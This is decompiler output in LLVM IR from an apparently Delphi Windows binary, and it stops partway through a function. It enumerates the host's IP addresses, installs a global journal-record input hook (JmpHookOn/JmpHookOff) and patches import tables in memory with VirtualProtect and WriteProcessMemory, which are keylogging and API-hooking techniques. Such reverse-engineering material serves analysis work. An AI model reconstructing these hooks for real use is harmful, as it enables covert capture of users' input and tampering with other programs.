define i32 @function_40742c() local_unnamed_addr {
dec_label_pc_40742c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1845
  %1 = call i32 @"@LStrClr"(), !insn.addr !1846
  ret i32 %1, !insn.addr !1847
}

define i32 @function_407444() local_unnamed_addr {
dec_label_pc_407444:
  %eax.0.reg2mem = alloca i32, !insn.addr !1848
  %esp.0.reg2mem = alloca i32, !insn.addr !1848
  %esp.15.reg2mem = alloca i32, !insn.addr !1848
  %storemerge6.reg2mem = alloca i32, !insn.addr !1848
  %.reg2mem = alloca i32, !insn.addr !1848
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1848
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1849
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1850
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1851
  %5 = call i32 @"@LStrClr"(), !insn.addr !1852
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1853
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1853
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1854
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1855
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1856
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1856
  %11 = icmp eq %hostent* %9, null, !insn.addr !1857
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1858
  br i1 %11, label %dec_label_pc_4074a2, label %dec_label_pc_40747c, !insn.addr !1858

dec_label_pc_40747c:                              ; preds = %dec_label_pc_407444
  %12 = add i32 %10, 12, !insn.addr !1859
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1859
  %14 = load i32, i32* %13, align 4, !insn.addr !1859
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1860
  %16 = load i32, i32* %15, align 4, !insn.addr !1860
  %17 = icmp eq i32 %16, 0, !insn.addr !1861
  %18 = icmp eq i1 %17, false, !insn.addr !1862
  br i1 %18, label %dec_label_pc_407483.lr.ph, label %dec_label_pc_40749d, !insn.addr !1862

dec_label_pc_407483.lr.ph:                        ; preds = %dec_label_pc_40747c
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1855
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_407483

dec_label_pc_407483:                              ; preds = %dec_label_pc_407483.lr.ph, %dec_label_pc_407495
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1863
  %21 = icmp eq i1 %20, false, !insn.addr !1864
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1864
  br i1 %21, label %dec_label_pc_407495, label %dec_label_pc_407487, !insn.addr !1864

dec_label_pc_407487:                              ; preds = %dec_label_pc_407483
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1865
  %23 = load i32, i32* %22, align 4, !insn.addr !1865
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1865
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1865
  store i32 %23, i32* %25, align 4, !insn.addr !1865
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1866
  %27 = call i32 @StrPas(), !insn.addr !1867
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1867
  br label %dec_label_pc_407495, !insn.addr !1867

dec_label_pc_407495:                              ; preds = %dec_label_pc_407487, %dec_label_pc_407483
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1868
  %29 = mul i32 %28, 4, !insn.addr !1860
  %30 = add i32 %29, %14, !insn.addr !1860
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1860
  %32 = load i32, i32* %31, align 4, !insn.addr !1860
  %33 = icmp eq i32 %32, 0, !insn.addr !1861
  %34 = icmp eq i1 %33, false, !insn.addr !1862
  store i32 %32, i32* %.reg2mem, !insn.addr !1862
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1862
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1862
  br i1 %34, label %dec_label_pc_407483, label %dec_label_pc_40749d, !insn.addr !1862

dec_label_pc_40749d:                              ; preds = %dec_label_pc_407495, %dec_label_pc_40747c
  %35 = call i32 @WSACleanup(), !insn.addr !1869
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1869
  br label %dec_label_pc_4074a2, !insn.addr !1869

dec_label_pc_4074a2:                              ; preds = %dec_label_pc_40749d, %dec_label_pc_407444
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1870
}

define i32 @function_4074b0() local_unnamed_addr {
dec_label_pc_4074b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1871
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1871
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1871
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1872
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1873
  %3 = add i32 %2, 1, !insn.addr !1873
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1873
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1874
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1875
  ret i32 0, !insn.addr !1876
}

define i32 @function_4074d5() local_unnamed_addr {
dec_label_pc_4074d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1877
  ret i32 %0, !insn.addr !1877
}

define i32 @function_4074da() local_unnamed_addr {
dec_label_pc_4074da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1878
}

define i32 @function_4074dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1879
}

define i32 @function_4074e0() local_unnamed_addr {
dec_label_pc_4074e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1880
  %2 = add i32 %1, -1, !insn.addr !1880
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1880
  ret i32 %0, !insn.addr !1881
}

define i32 @function_4074e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074e8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1882
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1882
  ret i32 %2, !insn.addr !1883
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407508:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224232 to i32*), i32 3), !insn.addr !1884
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1884
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1885
  %3 = icmp eq i32* %1, null, !insn.addr !1886
  %4 = icmp eq i1 %3, false, !insn.addr !1887
  %5 = sext i1 %4 to i32, !insn.addr !1888
  ret i32 %5, !insn.addr !1889
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407534:
  %0 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1890
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1891
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1891
  %3 = sext i1 %2 to i32, !insn.addr !1891
  ret i32 %3, !insn.addr !1892
}

define i32 @function_407540() local_unnamed_addr {
dec_label_pc_407540:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1893
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1893
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1893
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1894
  %2 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1895
  %3 = add i32 %2, 1, !insn.addr !1895
  store i32 %3, i32* @global_var_4096e8, align 4, !insn.addr !1895
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1896
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1897
  ret i32 0, !insn.addr !1898
}

define i32 @function_407565() local_unnamed_addr {
dec_label_pc_407565:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1899
  ret i32 %0, !insn.addr !1899
}

define i32 @function_40756a() local_unnamed_addr {
dec_label_pc_40756a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1900
}

define i32 @function_40756c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40756c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1901
}

define i32 @function_407570() local_unnamed_addr {
dec_label_pc_407570:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1902
  %2 = add i32 %1, -1, !insn.addr !1902
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1902
  ret i32 %0, !insn.addr !1903
}

define i32* @function_407578(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1904
  ret i32* %0, !insn.addr !1904
}

define i32 @function_407580() local_unnamed_addr {
dec_label_pc_407580:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1905
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1905
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1905
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1906
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !1907
  %3 = add i32 %2, 1, !insn.addr !1907
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !1907
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1908
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1909
  ret i32 0, !insn.addr !1910
}

define i32 @function_4075a5() local_unnamed_addr {
dec_label_pc_4075a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1911
  ret i32 %0, !insn.addr !1911
}

define i32 @function_4075aa() local_unnamed_addr {
dec_label_pc_4075aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1912
}

define i32 @function_4075ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1913
}

define i32 @function_4075b0() local_unnamed_addr {
dec_label_pc_4075b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !1914
  %2 = add i32 %1, -1, !insn.addr !1914
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !1914
  ret i32 %0, !insn.addr !1915
}

define i32 @function_407610(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407610:
  %esp.1.reg2mem = alloca i32, !insn.addr !1916
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1916
  %eax.0.reg2mem = alloca i32, !insn.addr !1916
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1917
  %7 = icmp eq i8 %6, 0, !insn.addr !1917
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1918
  br i1 %7, label %dec_label_pc_407623, label %dec_label_pc_40761b, !insn.addr !1918

dec_label_pc_40761b:                              ; preds = %dec_label_pc_407610
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1919
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1919
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1919
  br label %dec_label_pc_407623, !insn.addr !1919

dec_label_pc_407623:                              ; preds = %dec_label_pc_40761b, %dec_label_pc_407610
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1920
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1921
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1921
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1921
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1922
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1922
  store i32 %13, i32* %15, align 4, !insn.addr !1922
  %16 = icmp eq i32* %12, null, !insn.addr !1923
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1924
  br i1 %16, label %dec_label_pc_40767b, label %dec_label_pc_40763f, !insn.addr !1924

dec_label_pc_40763f:                              ; preds = %dec_label_pc_407623
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1925
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1926
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1926
  store i32 %17, i32* %19, align 4, !insn.addr !1926
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1927
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1928
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1928
  store i32 %20, i32* %22, align 4, !insn.addr !1928
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1929
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1929
  store i32 %arg3, i32* %24, align 4, !insn.addr !1929
  %25 = load i32, i32* %22, align 4, !insn.addr !1930
  %26 = add i32 %esp.0, -8, !insn.addr !1931
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1931
  store i32 %25, i32* %27, align 4, !insn.addr !1931
  %28 = add i32 %esp.0, -12, !insn.addr !1932
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1932
  store i32 %17, i32* %29, align 4, !insn.addr !1932
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1933
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1933
  %32 = add i32 %esp.0, -16, !insn.addr !1934
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1934
  store i32 %31, i32* %33, align 4, !insn.addr !1934
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1935
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1935
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1936
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1936
  store i32 %35, i32* %37, align 4, !insn.addr !1936
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1937
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1938
  br i1 %38, label %dec_label_pc_40767b, label %dec_label_pc_407667, !insn.addr !1938

dec_label_pc_407667:                              ; preds = %dec_label_pc_40763f
  %39 = load i32, i32* %24, align 4, !insn.addr !1939
  %40 = add i32 %esp.0, -20, !insn.addr !1940
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1940
  store i32 %39, i32* %41, align 4, !insn.addr !1940
  %42 = load i32, i32* %15, align 4, !insn.addr !1941
  %43 = add i32 %esp.0, -24, !insn.addr !1942
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1942
  store i32 %42, i32* %44, align 4, !insn.addr !1942
  %45 = call i32 @function_4076e4(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1943
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1943
  br label %dec_label_pc_40767b, !insn.addr !1943

dec_label_pc_40767b:                              ; preds = %dec_label_pc_407667, %dec_label_pc_40763f, %dec_label_pc_407623
  br i1 %7, label %dec_label_pc_407692, label %dec_label_pc_407683, !insn.addr !1944

dec_label_pc_407683:                              ; preds = %dec_label_pc_40767b
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !1945
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1946
  %48 = load i32, i32* %47, align 4, !insn.addr !1946
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !1946
  br label %dec_label_pc_407692, !insn.addr !1947

dec_label_pc_407692:                              ; preds = %dec_label_pc_407683, %dec_label_pc_40767b
  %49 = add i32 %eax.0.reload, 4, !insn.addr !1948
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1948
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1920
  ret i32 %eax.0.reload, !insn.addr !1949
}

define i32 @function_40769c() local_unnamed_addr {
dec_label_pc_40769c:
  %eax.1.reg2mem = alloca i32, !insn.addr !1950
  %eax.0.reg2mem = alloca i32, !insn.addr !1950
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !1951
  %4 = add i32 %3, 8, !insn.addr !1952
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1952
  %6 = load i32, i32* %5, align 4, !insn.addr !1952
  %7 = icmp eq i32 %6, 0, !insn.addr !1952
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1953
  br i1 %7, label %dec_label_pc_4076d6, label %dec_label_pc_4076ad, !insn.addr !1953

dec_label_pc_4076ad:                              ; preds = %dec_label_pc_40769c
  %8 = add i32 %3, 24, !insn.addr !1954
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1954
  %10 = load i32, i32* %9, align 4, !insn.addr !1954
  %11 = icmp eq i32 %10, 0, !insn.addr !1954
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1955
  br i1 %11, label %dec_label_pc_4076d6, label %dec_label_pc_4076b3, !insn.addr !1955

dec_label_pc_4076b3:                              ; preds = %dec_label_pc_4076ad
  %12 = add i32 %3, 4, !insn.addr !1956
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1956
  %14 = load i32, i32* %13, align 4, !insn.addr !1956
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1957
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !1958
  %17 = ptrtoint i32* %16 to i32, !insn.addr !1958
  %18 = load i32, i32* %5, align 4, !insn.addr !1959
  %19 = icmp eq i32 %18, %17, !insn.addr !1959
  %20 = icmp eq i1 %19, false, !insn.addr !1960
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !1960
  br i1 %20, label %dec_label_pc_4076d6, label %dec_label_pc_4076c1, !insn.addr !1960

dec_label_pc_4076c1:                              ; preds = %dec_label_pc_4076b3
  %21 = load i32, i32* %9, align 4, !insn.addr !1961
  %22 = call i32 @function_4076e4(i32 %21), !insn.addr !1962
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !1962
  br label %dec_label_pc_4076d6, !insn.addr !1962

dec_label_pc_4076d6:                              ; preds = %dec_label_pc_4076c1, %dec_label_pc_4076b3, %dec_label_pc_4076ad, %dec_label_pc_40769c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !1963
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !1964
  br i1 %24, label %dec_label_pc_4076e1, label %dec_label_pc_4076da, !insn.addr !1964

dec_label_pc_4076da:                              ; preds = %dec_label_pc_4076d6
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !1965
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !1965
  br label %dec_label_pc_4076e1, !insn.addr !1965

dec_label_pc_4076e1:                              ; preds = %dec_label_pc_4076da, %dec_label_pc_4076d6
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !1966
}

define i32 @function_4076e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4076e4:
  %eax.0.reg2mem = alloca i32, !insn.addr !1967
  %esp.0.reg2mem = alloca i32, !insn.addr !1967
  %storemerge6.reg2mem = alloca i32, !insn.addr !1967
  %.reg2mem14 = alloca i32, !insn.addr !1967
  %esp.17.reg2mem = alloca i32, !insn.addr !1967
  %esi.08.reg2mem = alloca i32, !insn.addr !1967
  %.reg2mem = alloca i32, !insn.addr !1967
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !1968
  %4 = icmp eq i1 %3, false, !insn.addr !1969
  %5 = icmp eq i32 %arg1, 0, !insn.addr !1970
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_407791, label %dec_label_pc_40770a, !insn.addr !1969

dec_label_pc_40770a:                              ; preds = %dec_label_pc_4076e4
  %6 = trunc i32 %2 to i16, !insn.addr !1971
  %7 = trunc i32 %1 to i8, !insn.addr !1972
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !1973
  %8 = inttoptr i32 %0 to i32*, !insn.addr !1974
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !1974
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1974
  %11 = icmp eq i32* %9, null, !insn.addr !1975
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1976
  br i1 %11, label %dec_label_pc_407791, label %dec_label_pc_40778a.preheader, !insn.addr !1976

dec_label_pc_40778a.preheader:                    ; preds = %dec_label_pc_40770a
  %12 = add i32 %10, 12, !insn.addr !1977
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1977
  %14 = load i32, i32* %13, align 4, !insn.addr !1977
  %15 = icmp eq i32 %14, 0, !insn.addr !1978
  %16 = icmp eq i1 %15, false, !insn.addr !1979
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !1979
  br i1 %16, label %dec_label_pc_407723.lr.ph, label %dec_label_pc_407791, !insn.addr !1979

dec_label_pc_407723.lr.ph:                        ; preds = %dec_label_pc_40778a.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1973
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !1980
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407723

dec_label_pc_407723:                              ; preds = %dec_label_pc_407723.lr.ph, %dec_label_pc_407787
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !1981
  %24 = add i32 %esp.17.reload, -4, !insn.addr !1982
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1982
  store i32 %18, i32* %25, align 4, !insn.addr !1982
  %26 = add i32 %esp.17.reload, -8, !insn.addr !1983
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1983
  store i32 %23, i32* %27, align 4, !insn.addr !1983
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !1984
  %29 = icmp eq i32 %28, 0, !insn.addr !1985
  %30 = icmp eq i1 %29, false, !insn.addr !1986
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1986
  br i1 %30, label %dec_label_pc_407787, label %dec_label_pc_407736, !insn.addr !1986

dec_label_pc_407736:                              ; preds = %dec_label_pc_407723
  %31 = add i32 %esi.08.reload, 16, !insn.addr !1987
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1987
  %33 = load i32, i32* %32, align 4, !insn.addr !1987
  %34 = add i32 %33, %arg1, !insn.addr !1988
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1989
  %36 = load i32, i32* %35, align 4, !insn.addr !1989
  %37 = icmp eq i32 %36, 0, !insn.addr !1990
  %38 = icmp eq i1 %37, false, !insn.addr !1991
  store i32 %36, i32* %.reg2mem14, !insn.addr !1991
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !1991
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1991
  br i1 %38, label %dec_label_pc_40773e, label %dec_label_pc_407787, !insn.addr !1991

dec_label_pc_40773e:                              ; preds = %dec_label_pc_407736, %dec_label_pc_40777e
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !1992
  %40 = icmp eq i1 %39, false, !insn.addr !1993
  br i1 %40, label %dec_label_pc_40777e, label %dec_label_pc_407743, !insn.addr !1993

dec_label_pc_407743:                              ; preds = %dec_label_pc_40773e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !1994
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1994
  store i32 %20, i32* %42, align 4, !insn.addr !1994
  %43 = add i32 %esp.17.reload, -16, !insn.addr !1995
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1995
  store i32 128, i32* %44, align 4, !insn.addr !1995
  %45 = add i32 %esp.17.reload, -20, !insn.addr !1996
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1996
  store i32 4, i32* %46, align 4, !insn.addr !1996
  %47 = add i32 %esp.17.reload, -24, !insn.addr !1997
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1997
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !1997
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1998
  %50 = add i32 %esp.17.reload, -28, !insn.addr !1999
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1999
  store i32 %21, i32* %51, align 4, !insn.addr !1999
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2000
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2000
  store i32 4, i32* %53, align 4, !insn.addr !2000
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2001
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2001
  store i32 %22, i32* %55, align 4, !insn.addr !2001
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2002
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2002
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2002
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2003
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2003
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2004
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2004
  store i32 %59, i32* %61, align 4, !insn.addr !2004
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2005
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2006
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2006
  store i32 %21, i32* %64, align 4, !insn.addr !2006
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2007
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2008
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2008
  store i32 %65, i32* %67, align 4, !insn.addr !2008
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2009
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2009
  store i32 4, i32* %69, align 4, !insn.addr !2009
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2010
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2010
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2010
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2011
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2012
  br label %dec_label_pc_407787, !insn.addr !2012

dec_label_pc_40777e:                              ; preds = %dec_label_pc_40773e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2013
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1989
